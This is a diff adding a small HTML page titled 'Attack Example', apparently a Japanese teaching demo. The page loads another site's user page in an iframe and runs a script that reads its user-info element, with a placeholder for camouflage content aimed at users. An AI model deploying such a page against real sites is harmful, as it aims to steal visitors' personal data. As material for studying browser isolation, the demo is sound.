@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attack Example</title>
+    <script>
+      function load() {
+        const userInfo = frm.document.querySelector("#user_info");
+        console.log(userInfo.textContent);
+      }
+    </script>
+  </head>
+  <body>
+    <div>
+      <!-- ユーザー向けカモフラージュ用のコンテンツがここに入る -->
+    </div>
+    <div>
+      <p>下記の枠線内にiframeのコンテンツが表示されている</p>
+      <iframe
+        style="border: 1px solid"
+        name="frm"
+        onload="load()"
+        src="http://site.example:3000/user.html"
+        frameborder="0"
+        width="80%"
+      />
+    </div>
+  </body>
+</html>
